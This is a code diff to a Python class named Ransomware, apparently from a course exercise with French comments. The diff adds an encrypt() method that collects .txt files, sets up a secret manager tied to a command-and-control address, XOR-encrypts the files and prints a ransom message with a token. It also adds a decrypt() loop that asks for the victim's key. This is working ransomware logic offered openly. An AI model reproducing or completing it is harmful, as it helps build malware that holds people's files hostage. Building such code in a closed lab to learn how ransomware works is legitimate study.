@@ -48,10 +48,33 @@ class Ransomware:
     def encrypt(self):
         # main function for encrypting (see PDF)
         raise NotImplemented()
+    
+    def encrypt(self):
+        # main function for encrypting (see PDF)
+        files = self.get_files("*.txt")
+        secret_manager = SecretManager(CNC_ADDRESS, TOKEN_PATH)
+        secret_manager.setup()
+        secret_manager.xorfiles(files)
+
+        print(ENCRYPT_MESSAGE.format(token=secret_manager.get_hex_token()))
+        # Chiffre les fichiers cibles puis affiche le message prédéfini et le token
 
     def decrypt(self):
         # main function for decrypting (see PDF)
-        raise NotImplemented()
+        secret_manager = SecretManager(CNC_ADDRESS, TOKEN_PATH)
+        secret_manager.load()
+        received_files = self.get_files("*.txt")
+        while True:
+            try:
+                candidate_key = input("Entrez la clé fournie: ")
+                secret_manager.set_key(candidate_key)
+                secret_manager.xorfiles(received_files)
+                print("Les fichiers ont été déchiffrés")
+                break
+
+            except ValueError as error:
+                print("Error",{error},"La clé proposée est invalide")
+        # Déchiffre les fichiers après avoir vérifié que la clé fournie est bien la bonne
 
 if __name__ == "__main__":
     logging.basicConfig(level=logging.DEBUG)
